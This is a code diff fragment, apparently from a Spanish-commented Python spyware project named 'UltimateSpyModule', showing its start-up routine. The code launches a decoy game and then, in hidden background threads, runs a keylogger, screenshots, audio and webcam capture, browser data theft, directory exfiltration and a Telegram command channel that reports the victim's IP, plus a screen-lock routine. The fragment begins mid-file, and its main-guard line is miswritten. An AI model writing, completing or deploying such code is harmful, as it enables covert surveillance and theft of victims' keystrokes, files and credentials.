@@ -1,0 +1,28 @@
+pass
+            time.sleep(5)
+
+    def start_all(self):
+        self.send_to_telegram(f"[*] MÓDULO ULTIMATE SPY ACTIVADO CON JUEGO INTEGRADO\nIP: {self.ip}")
+        
+        # 1. Lanzamos el juego una sola vez
+        self.lanzar_juego()
+        
+        # 2. Arrancamos todos los hilos en segundo plano (keylogger, exfiltración, escucha)
+        threading.Thread(target=self.start_keylogger, daemon=True).start()
+        threading.Thread(target=self.take_screenshot, daemon=True).start()
+        threading.Thread(target=self.record_audio, daemon=True).start()
+        threading.Thread(target=self.capture_webcam, daemon=True).start()
+        threading.Thread(target=self.extract_browser_data, daemon=True).start()
+        threading.Thread(target=self.exfiltrate_multiple_directories, daemon=True).start()
+        threading.Thread(target=self.escuchar_comandos_telegram, daemon=True).start()
+
+        # 3. El hilo principal vigila la bandera de bloqueo de forma segura
+        while True:
+            if self.lock_requested:
+                self.lock_requested = False
+                self.mostrar_bloqueo_total()
+            time.sleep(1)
+
+if name == "__main__":
+    spy = UltimateSpyModule()
+    spy.start_all()
